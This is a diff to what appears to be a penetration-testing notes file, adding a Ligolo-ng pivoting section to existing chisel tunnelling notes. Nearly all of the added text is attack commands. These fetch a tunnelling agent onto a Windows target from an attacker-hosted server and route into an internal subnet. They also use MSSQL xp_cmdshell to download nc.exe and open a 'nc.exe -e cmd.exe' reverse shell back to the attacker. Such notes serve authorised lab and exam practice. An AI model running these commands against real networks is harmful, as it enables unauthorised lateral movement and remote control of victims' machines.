@@ -79,3 +79,44 @@
 	- `local> ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
         - Due to proxy setup, chisel server will encapsulate whatever we sent through SOCKS port i.e. at `127.0.0.1:1080`  and push it through the HTTP Tunnel, SSH-encrypted. Chisel client will decapsulate it and push it wherever it is addressed.
 		- We can also perform, `/etc/proxychains4.conf` method for this.
+#### Ligolo-ng
+- The method of ligolo-ng is quite similar to SSH Remote Dynamic Port Forwarding , where ligolo-proxy acts as ssh server and ligolo-agent acts as ssh client. Any traffic on dedicated port will be pushed back by ssh server to ssh client.
+- **Get Ligolo Proxy and Agent**
+    - `Kali> wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_ARM64.tar.gz`
+	- `Kali> tar -xvzf ligolo-ng_proxy_0.4.3_Linux_ARM64.tar.gz`
+	- `Kali> mv ligolo-ng_proxy_0.4.3_Linux_ARM64 ligolo-proxy`
+	- `Kali> wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Windows_64bit.zip`
+	- `Kali> unzip ligolo-ng_agent_0.4.3_Windows_64bit.zip`
+	- `Kali> python3 -m http.server 80`
+	- `PS> iwr -uri http://<Attacker-IP>/ligolo-ng_agent_0.4.3_Windows_64bit.exe -Outfile ligolo-agent.exe`
+- **Setup port forwarding** - [Reference](https://github.com/nicocha30/ligolo-ng/wiki/Quickstart)
+    - `Kali> sudo ip tuntap add user [your_username] mode tun ligolo`
+	- `Kali> sudo ip link set ligolo up`
+	- `Kali> chmod +x ligolo-proxy`
+	- `Kali> ./ligolo-proxy -selfcert`
+	- `PS> .\ligolo-agent.exe -connect <Attacker-IP>:11601 -ignore-cert`
+	- `ligolo-proxy> session` → Select option from list
+	- `ligolo-proxy> ifconfig` → Shows all subnet for target machine
+	- `Kali> sudo ip route add 172.16.183.0/24 dev ligolo` - setup route to internal subnet (Here, let `172.16.183.0/24` be range of internal IP on target machine)
+	- `Kali> ip route` - check routing table entries
+	- `ligolo-proxy> start` - start port forwarding to internal subnet from Kali
+	- `Kali> nmap -sn -T5 172.16.183.0/24` - check if it shows expected results
+- **Ligolo-ng File Transfer**
+	- `Kali —→ MS01 (192.168.104.147, 10.10.64.147) ——→ MS02(10.10.64.148)`
+	- On Kali machine, in active session of MS01, `agent> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8000 --tcp` → This will open a new port on MS01 1234 and connect it to another port on Kali 8000 . Any traffic received on port 1234 on MS01 will be redirected to port 8000 on Kali.
+	- `Kali> python3 -m http.server`
+	- On MS02, `mssql> EXECUTE xp_cmdshell "curl http://10.10.64.147:1234/nc.exe -o C:\Tools\nc.exe";`
+![Screenshot of Ligolo File 1](./images/ligolo-file-1.png)
+![Screenshot of Ligolo File 2](./images/ligolo-file-2.png)
+![Screenshot of Ligolo File 3](./images/ligolo-file-3.png)
+- **Ligolo-ng Reverse Shell**
+	- `Kali —→ MS01 (192.168.104.147, 10.10.64.147) ——→ MS02(10.10.64.148)`
+	- On Kali machine, in active session of MS01, `agent> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:4444 --tcp` → This will open a new port on MS01 1235 and connect it to another port on Kali 4444 . Any traffic received on port 1235 on MS01 will be redirected to port 4444 on Kali.
+	- `Kali> nc -nlvp 4444`
+	- On MS02, `mssql> EXECUTE xp_cmdshell "C:\Tools\nc.exe -e cmd.exe 10.10.64.147 1235";`
+![Screenshot of Ligolo Reverse 1](./images/ligolo-reverse-1.png)
+![Screenshot of Ligolo Reverse 2](./images/ligolo-reverse-2.png)
+![Screenshot of Ligolo Reverse 3](./images/ligolo-reverse-3.png)
+#### Some Awesome References
+- [Ligolo-ng Pivoting Blog](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
+- [Network Pivoting with Ligolo-ng video](https://www.youtube.com/watch?v=DM1B8S80EvQ)
